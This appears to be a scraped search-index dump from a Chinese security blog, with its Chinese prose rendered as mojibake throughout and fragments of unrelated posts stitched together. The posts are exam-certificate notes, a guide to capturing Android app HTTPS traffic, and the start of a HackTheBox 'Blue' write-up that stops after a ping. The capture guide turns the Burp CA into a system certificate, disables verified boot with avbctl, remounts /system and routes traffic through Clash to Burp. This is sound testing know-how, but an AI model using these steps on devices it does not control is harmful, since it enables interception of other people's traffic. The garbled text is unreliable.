","date":"2023-02-06","objectID":"/posts/%E8%BD%AF%E8%80%83-%E4%B8%AD%E7%BA%A7%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88/:4:1","tags":["è¯ä¹¦"],"title":"è½¯è€ƒ-ä¸­çº§ä¿¡æ¯å®‰å…¨å·¥ç¨‹å¸ˆ","uri":"/posts/%E8%BD%AF%E8%80%83-%E4%B8%AD%E7%BA%A7%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88/"},{"categories":["èŒä¸šç”Ÿæ¶¯"],"content":"æŸ¥è¯ä¹¦ï¼š æ—¶é—´1æœˆ3æ—¥ï¼Œè·ç¦»è€ƒè¯•ç»“æŸ2ä¸ªæœˆå·¦å³ ç”µå­è¯ä¹¦åœ¨çº¿æŸ¥è¯¢ï¼š å…¨å›½ä¸“ä¸šæŠ€æœ¯äººå‘˜èŒä¸šèµ„æ ¼è¯ä¹¦-æŸ¥è¯¢éªŒè¯ç³»ç»Ÿ ï¼šæ²¡æ³¨å†Œè¿‡çš„åŒå­¦éœ€è¦å…ˆæ³¨å†Œä¸ªç”¨æˆ·ï¼Œè¿™é‡Œå¯ä»¥å…ˆä¸‹è½½ç”µå­ç‰ˆè¯ä¹¦ã€‚ è®¡ç®—æœºæŠ€æœ¯ä¸è½¯ä»¶ä¸“ä¸šæŠ€æœ¯èµ„æ ¼ï¼ˆæ°´å¹³ï¼‰è€ƒè¯•-è¯ä¹¦æŸ¥è¯¢ ï¼šå¯æŸ¥è¯¢è¯ä¹¦ç®¡ç†ç¼–å·åŠæœ‰æ•ˆæ€§ã€‚ ","date":"2023-02-06","objectID":"/posts/%E8%BD%AF%E8%80%83-%E4%B8%AD%E7%BA%A7%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88/:4:2","tags":["è¯ä¹¦"],"title":"è½¯è€ƒ-ä¸­çº§ä¿¡æ¯å®‰å…¨å·¥ç¨‹å¸ˆ","uri":"/posts/%E8%BD%AF%E8%80%83-%E4%B8%AD%E7%BA%A7%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88/"},{"categories":["èŒä¸šç”Ÿæ¶¯"],"content":"è¯ä¹¦é¢†å–ï¼ˆæœªç»å†ï¼‰ è¯ä¹¦é¢†å–æ—¶é—´ä¸€èˆ¬åœ¨è€ƒè¯•ç»“æŸå5-6ä¸ªæœˆå·¦å³å¼€å§‹é¢†å–ï¼Œå¦‚ä¸ŠåŠå¹´5æœˆä»½è½¯è€ƒè¯ä¹¦é¢†å–æ—¶é—´ä¸€èˆ¬ä»10æœˆåº•å¼€å§‹ï¼Œä¸‹åŠå¹´11æœˆä»½è½¯è€ƒè¯ä¹¦é¢†å–æ—¶é—´åˆ™ä¸€èˆ¬åœ¨æ¬¡å¹´3æœˆåº•é™†ç»­å¼€å§‹ã€‚ å„çœé¢†å–æ—¶é—´æœ‰æ‰€ä¸åŒï¼Œå…·ä½“è¯·è€ƒç”Ÿå…³æ³¨å½“åœ°è½¯è€ƒåŠå®˜ç½‘æˆ–äººäº‹è€ƒè¯•ç½‘ã€‚ è¯ä¹¦é¢†å–æ–¹å¼ï¼š ä¸ªäººé¢†è¯ï¼šå‡­æœ¬äººæœ‰æ•ˆèº«ä»½è¯åŸä»¶ç­‰èµ„æ–™é¢†å–; ä»–äºº(å•ä½)ä»£é¢†ï¼šå‡­ä»£é¢†äººåŠæŒè¯äººæœ‰æ•ˆèº«ä»½è¯åŸä»¶ç­‰èµ„æ–™é¢†å–(æœ‰äº›åœ°åŒºä¸æ”¯æŒä»£é¢†); è¯ä¹¦é‚®å¯„ï¼šç½‘ä¸Šç”³è¯·è¯ä¹¦é‚®å¯„(éƒ¨åˆ†åœ°åŒºæ”¯æŒ)ã€‚ è¯ä¹¦é¢†å–æµç¨‹ï¼šæºå¸¦ç›¸å…³èµ„æ–™è¯ä»¶ï¼Œå¦‚èº«ä»½è¯ã€å‡†è€ƒè¯ã€æˆç»©å•ç­‰; å¡«å†™ã€Šä¸“ä¸šèµ„æ ¼è€ƒè¯•ç™»è®°è¡¨ã€‹ã€‚ ","date":"2023-02-06","objectID":"/posts/%E8%BD%AF%E8%80%83-%E4%B8%AD%E7%BA%A7%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88/:4:3","tags":["è¯ä¹¦"],"title":"è½¯è€ƒ-ä¸­çº§ä¿¡æ¯å®‰å…¨å·¥ç¨‹å¸ˆ","uri":"/posts/%E8%BD%AF%E8%80%83-%E4%B8%AD%E7%BA%A7%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88/"},{"categories":["èŒä¸šç”Ÿæ¶¯"],"content":"äº”ã€æ³¨æ„äº‹é¡¹ è½¯è€ƒä¸èƒ½è¡¥æŠ¥åæˆ–è¡¥ç¼´è´¹ï¼Œé”™è¿‡æŠ¥åæˆ–ç¼´è´¹çš„ï¼Œå‡è§†ä¸ºæ”¾å¼ƒæŠ¥åï¼Œåªèƒ½æ¥å¹´å†æˆ˜äº†ã€‚ è€ƒè¯•æŠ¥åä¸¥æ ¼æ‰§è¡Œå±åœ°åŒ–ç®¡ç†ï¼Œç°å·¥ä½œåœ°æˆ–å±…ä½åœ°ä¸ºåŒ—äº¬åœ°åŒºçš„æŠ¥è€ƒäººå‘˜æ–¹å¯åœ¨åŒ—äº¬æŠ¥åå‚åŠ è€ƒè¯•ã€‚ è½¯è€ƒæ²¡æœ‰è¡¥è€ƒï¼Œå¤±è´¥äº†åªèƒ½æ¥å¹´å†æˆ˜ã€‚ å½“å‰æ˜¯ä¿¡æ¯å®‰å…¨å·¥ç¨‹å¸ˆï¼ˆç¬¬äºŒç‰ˆï¼‰ï¼Œè´­ä¹°æ•™è¾…ææ–™æ—¶æ³¨æ„åŒºåˆ†ã€‚ tag: #è¯ä¹¦ ","date":"2023-02-06","objectID":"/posts/%E8%BD%AF%E8%80%83-%E4%B8%AD%E7%BA%A7%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88/:5:0","tags":["è¯ä¹¦"],"title":"è½¯è€ƒ-ä¸­çº§ä¿¡æ¯å®‰å…¨å·¥ç¨‹å¸ˆ","uri":"/posts/%E8%BD%AF%E8%80%83-%E4%B8%AD%E7%BA%A7%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88/"},{"categories":["Pentest"],"content":"Mac ä¸‹Android APPæŠ“åŒ…é…ç½®.","date":"2023-01-14","objectID":"/posts/mac%E4%B8%8Bandroidapp%E6%8A%93%E5%8C%85%E9%85%8D%E7%BD%AE/","tags":["Android","Pentest"],"title":"Macä¸‹Android APPæŠ“åŒ…é…ç½®","uri":"/posts/mac%E4%B8%8Bandroidapp%E6%8A%93%E5%8C%85%E9%85%8D%E7%BD%AE/"},{"categories":["Pentest"],"content":"æ¢äº†Mç³»åˆ—èŠ¯ç‰‡çš„Macï¼Œè¿‡å»å¸¸ç”¨çš„æ¨¡æ‹Ÿå™¨éƒ½ä¸å¤ªæ”¯æŒï¼Œä¹‹å‰ç”¨è°·æ­Œçš„Android-emulator-m1-previewï¼Œåæ¥æ”¯æŒAndroid Studioäº†ï¼Œå°±ç”¨Android Studioé…ç½®æµ‹è¯•ç¯å¢ƒã€‚ ","date":"2023-01-14","objectID":"/posts/mac%E4%B8%8Bandroidapp%E6%8A%93%E5%8C%85%E9%85%8D%E7%BD%AE/:0:0","tags":["Android","Pentest"],"title":"Macä¸‹Android APPæŠ“åŒ…é…ç½®","uri":"/posts/mac%E4%B8%8Bandroidapp%E6%8A%93%E5%8C%85%E9%85%8D%E7%BD%AE/"},{"categories":["Pentest"],"content":"ä¸€ã€éš¾ç‚¹ï¼š APPå­˜åœ¨rootæ£€æµ‹ï¼› APPä¸èµ°WiFiè®¾ç½®çš„ä»£ç†ï¼› HTTPSæŠ“åŒ…æ— æ³•è§£å¯†ï¼› ä¼ ç»ŸæŠ“åŒ…æ— æ•ˆ ","date":"2023-01-14","objectID":"/posts/mac%E4%B8%8Bandroidapp%E6%8A%93%E5%8C%85%E9%85%8D%E7%BD%AE/:1:0","tags":["Android","Pentest"],"title":"Macä¸‹Android APPæŠ“åŒ…é…ç½®","uri":"/posts/mac%E4%B8%8Bandroidapp%E6%8A%93%E5%8C%85%E9%85%8D%E7%BD%AE/"},{"categories":["Pentest"],"content":"äºŒã€æ€è·¯ï¼š æ¨¡æ‹Ÿå™¨ï¼ˆAndroid Studio çš„ AVDï¼‰ ä»£ç†è½¬å‘å·¥å…·ï¼ˆClashï¼‰ æŠ“åŒ…è½¯ä»¶ï¼ˆburpsuiteï¼ŒCharlesï¼ŒFiddleréƒ½è¡Œï¼‰ï¼Œå¯¼å…¥ç³»ç»Ÿè¯ä¹¦è§£å¯†https æ‰€éœ€å·¥å…·å³ï¼šä¸€ä¸ªåˆé€‚çš„æ¨¡æ‹Ÿå™¨+æ”¯æŒhttpsçš„æŠ“åŒ…è½¯ä»¶+æµé‡è½¬å‘å·¥å…· æœ¬æ–‡å³AVD+Clash+Burp ","date":"2023-01-14","objectID":"/posts/mac%E4%B8%8Bandroidapp%E6%8A%93%E5%8C%85%E9%85%8D%E7%BD%AE/:2:0","tags":["Android","Pentest"],"title":"Macä¸‹Android APPæŠ“åŒ…é…ç½®","uri":"/posts/mac%E4%B8%8Bandroidapp%E6%8A%93%E5%8C%85%E9%85%8D%E7%BD%AE/"},{"categories":["Pentest"],"content":"ä¸‰ã€è¡ŒåŠ¨ ","date":"2023-01-14","objectID":"/posts/mac%E4%B8%8Bandroidapp%E6%8A%93%E5%8C%85%E9%85%8D%E7%BD%AE/:3:0","tags":["Android","Pentest"],"title":"Macä¸‹Android APPæŠ“åŒ…é…ç½®","uri":"/posts/mac%E4%B8%8Bandroidapp%E6%8A%93%E5%8C%85%E9%85%8D%E7%BD%AE/"},{"categories":["Pentest"],"content":"3.1 åˆ›å»ºAndroid Virtual Deviceï¼ˆAVDï¼‰ å›½å†…çš„å„ç§æ¨¡æ‹Ÿå™¨ä¸å¤ªæ”¯æŒm1èŠ¯ç‰‡ï¼Œäºæ˜¯å°±ä¸Šæ‰‹Android Studioä¸­çš„ AVDã€‚ é…ç½®è‡ªå·±é€‰åˆé€‚çš„ï¼Œæˆ‘æ˜¯ Pixel 5 + Tiramisu(API 33)ï¼Œéœ€è¦å¤šè¯•å‡ ä¸ªç‰ˆæœ¬ å¯èƒ½é‡åˆ°çš„é—®é¢˜ï¼š Androidç‰ˆæœ¬å¤ªä½ï¼ŒAPPä¸æ”¯æŒï¼› Androidç‰ˆæœ¬æœ‰rootï¼ŒAPPå­˜åœ¨æ£€æµ‹ï¼Œä¸å…è®¸åœ¨rootç¯å¢ƒä¸‹è¿è¡Œï¼› Androidæ¶æ„å†²çªï¼ŒAPPæ— æ³•å®‰è£…ï¼› å…¶ä»– åˆ›å»ºè¿‡ç¨‹å¦‚ä¸‹ï¼š Openä¸€ä¸ªç©ºæ–‡ä»¶å¤¹ä½œä¸ºæ–°é¡¹ç›®ï¼Œæˆ–è€…ç›´æ¥é€‰æ‹©Profile or Debug APKåŠ è½½ä¸€ä¸ªAPKéƒ½å¯ä»¥ã€‚ è¿›å…¥é¡¹ç›®åï¼Œç‚¹å‡»å³ä¾§Device Manager â€“ Create deviceåˆ›å»ºAVDæ¨¡æ‹Ÿå™¨ï¼ŒæŒ‘é€‰Androidç³»ç»Ÿé•œåƒæ—¶æ ¹æ®éœ€è¦é€‰æ‹©åˆé€‚çš„ç³»ç»Ÿã€‚ è®¾ç½®å®Œä¹‹åå°±ä¼šåœ¨Device Manageråˆ—è¡¨ä¸­å‡ºç°ä¸€ä¸ªæ–°çš„æ¨¡æ‹Ÿå™¨ã€‚ å»ºè®®å…ˆå¯åŠ¨ä¸€ä¸‹æ¨¡æ‹Ÿå™¨ï¼Œæ£€æŸ¥çº¯å‡€çŠ¶æ€ä¸‹ç½‘ç»œæ˜¯å¦æ­£å¸¸ã€å¾…æµ‹è¯•APKèƒ½å¦é¡ºåˆ©å®‰è£…å¹¶æ­£å¸¸è¿è¡Œã€‚ ä¸€åˆ‡é¡ºåˆ©çš„è¯ï¼Œæ¥ä¸‹å»å®‰è£…Clashå’ŒBurpç³»ç»Ÿè¯ä¹¦ã€‚ ","date":"2023-01-14","objectID":"/posts/mac%E4%B8%8Bandroidapp%E6%8A%93%E5%8C%85%E9%85%8D%E7%BD%AE/:3:1","tags":["Android","Pentest"],"title":"Macä¸‹Android APPæŠ“åŒ…é…ç½®","uri":"/posts/mac%E4%B8%8Bandroidapp%E6%8A%93%E5%8C%85%E9%85%8D%E7%BD%AE/"},{"categories":["Pentest"],"content":"3.2 åˆ›å»ºburpè¯ä¹¦ é«˜ç‰ˆæœ¬Androidç³»ç»Ÿï¼Œå¯¼å…¥è¯ä¹¦å®‰è£…åä¸€èˆ¬éƒ½æ˜¯ç”¨æˆ·è¯ä¹¦ï¼Œæˆ‘ä»¬éœ€è¦èŠ±ç‚¹åŠŸå¤«å°†å…¶å˜æˆç³»ç»Ÿè¯ä¹¦ã€‚ æ‰“å¼€burpï¼Œç”µè„‘æµè§ˆå™¨è®¿é—®\"http://burpâ€œå¹¶ä¸‹è½½è¯ä¹¦cacert.cerï¼Œè·å¾—è¯ä¹¦æ–‡ä»¶cacert.cerä¹‹åï¼Œå‡†å¤‡å°†å…¶è½¬æ¢æˆå¯æ”¾å…¥ç³»ç»Ÿè¯ä¹¦åº“çš„æ–‡ä»¶ã€‚ ä¸‹åˆ—æ–¹æ³•ä¸€å’ŒäºŒæœ¬è´¨æ˜¯ä¸€æ ·çš„ï¼Œéƒ½è¡Œã€‚ æ–¹æ³•ä¸€ï¼š openssl x509 -inform DER -subject_hash_old -in è¯ä¹¦æ–‡ä»¶.cer è·å¾—çº¢æ¡†ä¸­çš„hashå€¼å¹¶æŠŠå®ƒä½œä¸ºåç»­çš„æ”¾å…¥åˆ°ç³»ç»Ÿè¯ä¹¦åº“çš„è¯ä¹¦åå­—ï¼Œä¸€èˆ¬burpçš„è¯ä¹¦åä¸ºï¼ˆ9a5ba575.0ï¼‰ openssl x509 -inform DER -text -in è¯ä¹¦æ–‡ä»¶.cer \u003e hashå€¼.0 æ–¹æ³•äºŒï¼š å…ˆå°†burpçš„è¯ä¹¦è½¬æ¢ä¸ºpemæ ¼å¼ï¼Œå†è®¡ç®—å…¶hashå€¼ï¼Œç„¶åé‡å‘½åä¸ºå¯ä»¥å¯¼å…¥Androidç³»ç»Ÿçš„xxx.0æ–‡ä»¶ã€‚ xavier@Mac Desktop % openssl x509 -inform DER -in 2.der -out 2.pem xavier@Mac Desktop % openssl x509 -inform PEM -subject_hash_old -in 2.pem| head -1 9a5ba575 xavier@Mac Desktop % cp 2.pem 9a5ba575.0 ","date":"2023-01-14","objectID":"/posts/mac%E4%B8%8Bandroidapp%E6%8A%93%E5%8C%85%E9%85%8D%E7%BD%AE/:3:2","tags":["Android","Pentest"],"title":"Macä¸‹Android APPæŠ“åŒ…é…ç½®","uri":"/posts/mac%E4%B8%8Bandroidapp%E6%8A%93%E5%8C%85%E9%85%8D%E7%BD%AE/"},{"categories":["Pentest"],"content":"3.3ã€å¯¼å…¥ç³»ç»Ÿè¯ä¹¦ 3.3.1 å‘ç‚¹1ï¼š è·å¾—äº†ä¿®æ”¹å¥½çš„è¯ä¹¦æ–‡ä»¶ï¼ˆ9a5ba575.0ï¼‰ä¹‹åï¼Œå°±éœ€è¦å°†è¯ä¹¦æ”¾å…¥AVDçš„ç›®å½•å½“ä¸­ï¼Œç›´æ¥adb pushä¼šæŠ¥command not foundï¼ŒRead-onlyï¼Œç›´æ¥adb root ã€adb remountä¹Ÿä¼šæŠ¥é”™ã€‚ æŠ¥é”™è®°å½•ï¼š xavier@Mac Desktop % adb root zsh: command not found: adb xavier@Mac Desktop % adb root restarting adbd as root xavier@Mac Desktop % adb remount /system/bin/sh: remount: inaccessible or not found xavier@Mac Desktop % adb push 9a5ba575.0 /system/etc/security/cacerts/ 9a5ba575.0: 1 file pushed, 0 skipped. 7.2 MB/s (1330 bytes in 0.000s) adb: error: failed to copy '9a5ba575.0' to '/system/etc/security/cacerts/9a5ba575.0': remote couldn't create file: Read-only file system xavier@Mac Desktop % adb root adbd is already running as root 3.3.2 é…ç½®SDKç¯å¢ƒå˜é‡ å¯åŠ¨AVDä¹‹å‰ï¼Œéœ€è¦é…ç½®ä¸€ä¸‹Androidç›¸å…³çš„ç¯å¢ƒå˜é‡ã€‚ æ‰“å¼€ .bash_profile å†™å…¥ç¯å¢ƒå˜é‡ï¼švim ~/.bash_profileã€‚ # Android SDK export ANDROID_HOME=~/Library/Android/sdk export PATH=\"$ANDROID_HOME/emulator:$ANDROID_HOME/tools:$ANDROID_HOME/tools/bin:$ANDROID_HOME/cmdline-tools/latest:$ANDROID_HOME/cmdline-tools/latest/bin:$ANDROID_HOME/platform-tools:$PATH\" ä¿å­˜å¹¶é€€å‡ºï¼Œsource ~/.bash_profileå¹¶ä½¿å…¶ç”Ÿæ•ˆã€‚ æ³¨æ„ï¼šå¦‚æœæ²¡æœ‰é‡å¯ç»ˆç«¯ï¼Œæ–°æ‰“å¼€çš„ç»ˆç«¯é»˜è®¤åŠ è½½æ—§çš„é…ç½®ï¼Œéœ€è¦æ‰‹åŠ¨source ~/.bash_profileä½¿å…¶ç”Ÿæ•ˆã€‚ 3.3.3 emulatorå¯åŠ¨AVD ç°åœ¨æˆ‘ä»¬å¿…é¡»å°† CA è¯ä¹¦æ”¾åœ¨ä½äºAndroid æ–‡ä»¶ç³»ç»Ÿä¸­çš„/system/etc/security/cacerts/ç³»ç»Ÿè¯ä¹¦å­˜å‚¨åº“ä¸­ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œ/systemåˆ†åŒºä»¥åªè¯»æ–¹å¼æŒ‚è½½ã€‚å› æ­¤éœ€è¦è·å¾—/systemåˆ†åŒºçš„å†™å…¥æƒé™å¹¶å¤åˆ¶ä¸Šä¸€æ­¥ä¸­åˆ›å»ºçš„è¯ä¹¦ã€‚ é€šè¿‡å‘½ä»¤è¡Œé…ç½®å¯åŠ¨å‚æ•°çš„æ–¹å¼è¿è¡ŒAVDï¼ˆå‚è€ƒï¼šè§£å†³Android Studio ADVæ¨¡æ‹Ÿå™¨æ— æ³•ä½¿ç”¨remountå‘½ä»¤è®°å½•ï¼‰ï¼Œå°±å¯ä»¥ä»¥å†™çš„æ–¹å¼å¯åŠ¨AVDå¹¶å‘ç³»ç»Ÿç›®å½•å†™å…¥è¯ä¹¦æ–‡ä»¶ã€‚ è¿›å…¥åˆ°AVDç›®å½•å¹¶ä»¥ â€œ-writable-systemâ€ çš„æ–¹å¼å¯åŠ¨AVD æ³¨æ„ï¼šå¦‚æœä½ æƒ³ä½¿ç”¨ä½ çš„è¯ä¹¦ï¼Œä½ å¿…é¡»ä½¿ç”¨ -writable-system é€‰é¡¹å¯åŠ¨æ¨¡æ‹Ÿå™¨ã€‚å¦åˆ™ Android å°†åŠ è½½â€œå¹²å‡€â€çš„ç³»ç»Ÿé•œåƒã€‚ cd /Users/xxx/Library/Android/sdk/emulator/ #æŸ¥çœ‹æ¨¡æ‹Ÿå™¨åå­— ./emulator -list-avds ./emulator -avd '@æ¨¡æ‹Ÿå™¨åå­—' -writable-system ç„¶åå°±å¯ä»¥çœ‹åˆ°AVDè¿è¡Œäº†èµ·æ¥ï¼Œ å¦‚æœèƒ½é€‰ç”¨çš„Androidé•œåƒAPI Level \u003e28ï¼ˆAndroid 9.0ä»¥ä¸Šï¼‰ï¼Œåˆ™å¯èƒ½éœ€è¦ç¦ç”¨å®‰å…¨å¯åŠ¨éªŒè¯ï¼ŒAPI Level\u003c=28ï¼ˆAndroid 9.0åŠä»¥ä¸‹ï¼‰å¯ä»¥è·³è¿‡è¿™æ­¥ã€‚ $ adb root $ adb shell avbctl disable-verification # ç¦ç”¨å®‰å…¨å¯åŠ¨éªŒè¯ $ adb reboot æ­¤æ—¶å†åœ¨æ§åˆ¶å°æ‰§è¡Œremountå‘½ä»¤æŒ‚è½½æ–‡ä»¶ç³»ç»Ÿï¼Œæ¥ç€å°±å¯ä»¥pushæˆ‘ä»¬ä¿®æ”¹å¥½çš„ç³»ç»Ÿè¯ä¹¦æ–‡ä»¶äº†ã€‚ $ adb root $ adb remount # å¦‚æœ adb å‘Šè¯‰æ‚¨éœ€è¦é‡æ–°å¯åŠ¨ï¼Œè¯·å†æ¬¡é‡æ–°å¯åŠ¨ adb reboot å¹¶å†æ¬¡è¿è¡Œ adb remount #æ¨å…¥è¯ä¹¦ $ adb push /path/to/burp-cert /system/etc/security/cacerts/ $ adb push 9a5ba575.0 /system/etc/security/cacerts/ æ£€æŸ¥è¯ä¹¦æƒé™ï¼š xavier@Mac emulator % adb shell ls -al /system/etc/security/cacerts/ | grep 9a -rw-r--r-- 1 root root 8650 2022-07-08 05:11 3c9a4d3b.0 -rw-r--r-- 1 root root 1330 2023-01-05 14:50 9a5ba575.0 -rw-r--r-- 1 root root 2938 2022-07-08 05:11 9aef356c.0 -rw-r--r-- 1 root root 2760 2022-07-08 05:11 ed39abd0.0 æ£€æŸ¥æ˜¯å¦æˆåŠŸåŠ å…¥ç³»ç»Ÿè¯ä¹¦ï¼š å®‰å“æ¨¡æ‹Ÿå™¨ï¼š è®¾ç½®-å®‰å…¨-æ›´å¤šå®‰å…¨è®¾ç½®-åŠ å¯†ä¸å‡­æ®-ä¿¡ä»»çš„å‡­æ®ï¼š ä¸åŒç‰ˆæœ¬çš„Androidç³»ç»Ÿè·¯å¾„ä¹Ÿä¸ä¸€æ ·ï¼Œå¯ä»¥è¿›è®¾ç½®åç›´æ¥æœç´¢â€œå‡­æ®â€ æˆ–â€œcerdentialsâ€ã€‚AVDå¯åŠ¨åé»˜è®¤è¯­è¨€æ˜¯è‹±è¯­ï¼Œå¯ä»¥è‡ªè¡Œä¿®æ”¹ã€‚ 3.3.4 è¡¥å……è¯´æ˜ï¼š é€šè¿‡å‘½ä»¤è¡Œå¯åŠ¨AVD æ ¹æ®APIå·®å¼‚ï¼Œå¯èƒ½å­˜åœ¨ä¸åŒã€‚ API LEVEL \u003e 28 çš„è¯´æ˜ï¼š Tested on emulators running API LEVEL 29 and 30 $ emulator -list-avds $ emulator -avd \u003cavd_name_here\u003e -writable-system # (å¦‚æœè¦çœ‹å†…æ ¸æ—¥å¿—ï¼Œå¯ä»¥åŠ ä¸Š -show-kernel) $ adb root $ adb shell avbctl disable-verification # ç¦ç”¨å®‰å…¨å¯åŠ¨éªŒè¯ $ adb reboot $ adb root $ adb remount # å°†åˆ†åŒºé‡æ–°æŒ‚è½½ä¸ºè¯»å†™ $ adb push \u003cpath_to_certificate\u003e /system/etc/security/cacerts $ adb shell chmod 664 /system/etc/security/cacerts/\u003cname_of_pushed_certificate\u003e $ adb reboot API LEVEL \u003c= 28 çš„è¯´æ˜ï¼š Tested on emulators running API LEVEL 26, 27 and 28 $ emulator -list-avds $ emulator -avd \u003cavd_name_here\u003e -writable-system # (å¦‚æœè¦çœ‹å†…æ ¸æ—¥å¿—ï¼Œå¯ä»¥åŠ ä¸Š -show-kernel) $ adb root $ adb remount # å°†åˆ†åŒºé‡æ–°æŒ‚è½½ä¸ºè¯»å†™ $ adb push \u003cpath_to_certificate\u003e /system/etc/security/cacerts $ adb shell chmod 664 /system/etc/security/cacerts/\u003cname_of_pushed_certificate\u003e $ adb reboot ","date":"2023-01-14","objectID":"/posts/mac%E4%B8%8Bandroidapp%E6%8A%93%E5%8C%85%E9%85%8D%E7%BD%AE/:3:3","tags":["Android","Pentest"],"title":"Macä¸‹Android APPæŠ“åŒ…é…ç½®","uri":"/posts/mac%E4%B8%8Bandroidapp%E6%8A%93%E5%8C%85%E9%85%8D%E7%BD%AE/"},{"categories":["Pentest"],"content":"3.4 æŠ“åŒ…ï¼ˆclash+burpï¼‰ 3.4.1.å®‰è£…é…ç½®Clash ç½‘ä¸Šæ‰¾äº†ä¸€ä¸ªclash for Androidï¼šä¸‹è½½é“¾æ¥ ClashForAndroidï¼šhttps://github.com/Kr328/ClashForAndroid ç›¸å…³æ•™ç¨‹ï¼ˆæ²¡ç”¨åˆ°ï¼‰ å®‰è£…clashï¼Œå¯ä»¥ç›´æ¥ç”¨adb installï¼š xavier@Mac emulator % adb install ~/Downloads/cfa-2.5.12-foss-universal-release.apk Performing Streamed Install Success é…ç½®yamlè§„åˆ™æ–‡ä»¶ï¼Œåªè¦å°†é…ç½®æ–‡ä»¶ä¸­çš„serverå’Œportä¿®æ”¹æˆburpç›‘å¬çš„ipå’Œportå°±å¯ä»¥äº†ï¼ˆè‡³äºå…¶ä»–é…ç½®ï¼Œå¯ä»¥æŸ¥é˜…ç›¸å…³æ–‡æ¡£è¿›è¡Œè‡ªå®šä¹‰çš„é…ç½®ï¼‰ mixed-port: 7890 allow-lan: false mode: global log-level: info external-controller: 127.0.0.1:9090 proxies: - name: \"burp\" type: http server: 192.168.70.72 port: 8080 proxy-groups: - name: Proxy type: select proxies: - burp ä¿®æ”¹å®Œä¹‹åç›´æ¥adb pushåˆ°AVDå½“ä¸­ã€‚ % adb push ~/Desktop/clash-config.yml /sdcard/ /Users/xavier/Desktop/clash-config.yml...kipped. 1.9 MB/s (252 bytes in 0.000s) ç„¶åæ‰“å¼€clashï¼Œâ€œé…ç½®â€“\u003e+â€“\u003eæ–‡ä»¶:ä»æ–‡ä»¶å¯¼å…¥â€“\u003eæµè§ˆæ–‡ä»¶â€“\u003eæ›´å¤š:å¯¼å…¥\"ä»æ–‡ä»¶å¯¼å…¥é…ç½®å°±å¯ä»¥äº†ã€‚ ä½¿ç”¨æ—¶åœ¨\"é…ç½®\"ä¸­å‹¾é€‰åˆšå¯¼å…¥çš„é…ç½®æ–‡ä»¶ ç‚¹å‡»è¿è¡Œï¼š è¿›å…¥â€ä»£ç†â€œï¼Œç‚¹å‡»å³ä¸‹è§’é—ªç”µæ ‡å¿—ï¼Œæµ‹è¯•ä»£ç†æ˜¯å¦æ­£å¸¸ï¼Œæµ‹è¯•è¿æ¥å‡ºç°æ•°å­—è¡¨æ˜è¿æ¥æ­£å¸¸ã€‚ 3.4.2 burpä»£ç†è®¾ç½® burpéƒ¨åˆ†çš„ä»£ç†ä¸å¤šè¯´äº† ","date":"2023-01-14","objectID":"/posts/mac%E4%B8%8Bandroidapp%E6%8A%93%E5%8C%85%E9%85%8D%E7%BD%AE/:3:4","tags":["Android","Pentest"],"title":"Macä¸‹Android APPæŠ“åŒ…é…ç½®","uri":"/posts/mac%E4%B8%8Bandroidapp%E6%8A%93%E5%8C%85%E9%85%8D%E7%BD%AE/"},{"categories":["Pentest"],"content":"å››ã€å…¶ä»–-å¾…è¡¥å…… burpé‚£ä¸€å—æ¢æˆcharleså’ŒfiddleræŠ“åŒ…ï¼Œä¹Ÿæ˜¯å¯ä»¥çš„ ","date":"2023-01-14","objectID":"/posts/mac%E4%B8%8Bandroidapp%E6%8A%93%E5%8C%85%E9%85%8D%E7%BD%AE/:4:0","tags":["Android","Pentest"],"title":"Macä¸‹Android APPæŠ“åŒ…é…ç½®","uri":"/posts/mac%E4%B8%8Bandroidapp%E6%8A%93%E5%8C%85%E9%85%8D%E7%BD%AE/"},{"categories":["Pentest"],"content":"å‚è€ƒæ–‡ç« ï¼š æ•´åˆä¸€ä¸ªAndroidæŠ“åŒ…æ–°å§¿åŠ¿ï¼ˆAVD+https+remount+clashä»£{è¿‡}{æ»¤}ç†è½¬å‘+burp ç‰ˆï¼‰â€”â€”52ç ´è§£-Fythem clashå„å¹³å°ä½¿ç”¨æ•™ç¨‹ï¼šé™¤äº†ä¸‹è½½æ–‡ä»¶ï¼Œå…¶ä»–æ²¡æ€ä¹ˆç”¨ä¸Š adb å¯¼å…¥ burp è¯ä¹¦ï¼šAndroidç³»ç»Ÿè¯ä¹¦çš„åˆ¶ä½œ Android Studio è‡ªå¸¦æ¨¡æ‹Ÿå™¨è·å–rootæƒé™ï¼šç”¨äº†ç¬¬ä¸€éƒ¨åˆ†ï¼Œå®ç°å¯¼å…¥ç³»ç»Ÿè¯ä¹¦ Install System CA Certificate on Android Emulator #è§£å†³é—®é¢˜ #APK #AVD #Android #clash #Burp ","date":"2023-01-14","objectID":"/posts/mac%E4%B8%8Bandroidapp%E6%8A%93%E5%8C%85%E9%85%8D%E7%BD%AE/:5:0","tags":["Android","Pentest"],"title":"Macä¸‹Android APPæŠ“åŒ…é…ç½®","uri":"/posts/mac%E4%B8%8Bandroidapp%E6%8A%93%E5%8C%85%E9%85%8D%E7%BD%AE/"},{"categories":["é¶åœº"],"content":"Blue ç®€ä»‹ OSï¼šWindowsï¼› éš¾åº¦ï¼šEasy ","date":"2022-03-28","objectID":"/posts/hackthebox-blue/:1:0","tags":["OSCP","HTB"],"title":"HTBé¶æœº Blue WriteUp","uri":"/posts/hackthebox-blue/"},{"categories":["é¶åœº"],"content":"WriteUp è¿æ¥HTBé¶åœºï¼šsudo openvpn xxxx.ovpn æµ‹è¯•é¶æœºè¿é€šæ€§ï¼š â”Œâ”€â”€(xavierã‰¿xavier)-[~] â””â”€$ ping -c 4 10.10.10.40 PING 10.10.10.40 (10.10.10.40) 56(84) bytes of data. 64 bytes from 10.10.10.40: icmp_seq=1 ttl=127 time=238 ms 64 bytes from 10.10.10.40: icmp_seq=3 ttl=127 time=237 ms 64 bytes from 